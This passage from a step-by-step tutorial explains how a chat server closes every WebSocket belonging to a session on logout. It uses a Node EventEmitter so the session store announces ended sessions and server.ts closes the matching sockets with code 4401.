   - show it in the chat: `addMessage({ kind: 'system', text: 'You were disconnected: ' + event.reason, receivedAt: Date.now() })`;
   - return.
2. (Optional) Add `role` to `src/api/auth.ts`'s schemas and the auth store, and show `Logged in as Admin (admin)` in the `UserBar`. The server enforces the role either way; this is display only.
3. Run `npx tsc -b`.

---

## §8. Revoking access: logging out closes open sockets (6h)

### The gap 6g left

6g's check is **lazy**: a logged-out socket is noticed only when it sends its next message. Until then:

- it keeps **receiving** every chat message (reading needs no permission check, there's no message from the client to check);
- the other tab keeps showing "Logged in as Gena" and a working chat (the note in the 6b checklist).

For a chat that's a privacy leak: you logged out on a shared computer, and the other tab keeps streaming your conversations. The fix is the **eager** check: the moment a session ends, the server closes every socket that belongs to it.

### The problem: two parts of the server that don't know each other

- Logging out happens in `auth/authController.ts` → `deleteSession()` in `auth/sessions.ts`.
- The sockets live in `server.ts`, in the `clients` Map.

`sessions.ts` could import `clients` from `server.ts` and close them itself. But then the session store would depend on the WebSocket code (and `server.ts` already imports `sessions.ts`: a circular import). The session store's job is sessions, not sockets.

### The fix: the session store announces, the server listens

You already used this pattern on the client in 6c: `main.tsx` **subscribes** to `authStore` and connects/disconnects, while `authStore` knows nothing about sockets. On the server, the Node way to do that is an **EventEmitter**, the same `.on(...)` you've seen on `ws` sockets since 5a:

```ts
// auth/sessions.ts
export const sessionEvents = new EventEmitter<{ ended: [sessionId: string] }>();

export const deleteSession = (sessionId: string) => {
  // ...delete it...
  sessionEvents.emit('ended', sessionId);
};
```

```ts
// server.ts
sessionEvents.on('ended', (sessionId) => {
  for (const [socket, client] of clients) {
    if (client.sessionId === sessionId) {
      socket.close(4401, 'logged out');
    }
  }
});
```

- `sessions.ts` doesn't know who's listening. `server.ts` decides what "a session ended" means for sockets.
- That's why 6g stored `sessionId` in `ClientState`: now it's how we find a session's sockets.
- `emit` calls the listeners **synchronously**, right there inside `deleteSession`. By the time `/api/logout` answers `204`, the close frames are already on their way.
- Anything else that ends a session (server-side expiry, an admin "log out everywhere", a password change) just calls `deleteSession` and gets the same behaviour for free.

The client side is already done. `4401` → no retry → `loadUser()` → the server says `{ name: null }` → the `UserBar` shows the login form. In **every** tab of that browser, because each tab's socket gets its own `4401`.

### One server vs many

This works because the session store and all the sockets live in **one process**. With several server instances behind a load balancer, the logout request may land on instance A while your other tab's socket is on instance B. Then "a session ended" has to travel between instances, usually through Redis pub/sub. Same event, a longer wire. That's Stage 9.

### What Claude changes on the server

- `auth/sessions.ts`: `sessionEvents` (an `EventEmitter`), emitting `ended` from `deleteSession`.
- `server.ts`: one `sessionEvents.on('ended', ...)` listener closing that session's sockets with `4401 'logged out'`.
- The lazy check from 6g stays: it's still the safety net (for example, for a message that arrives in the same moment).

No frontend task: test only.

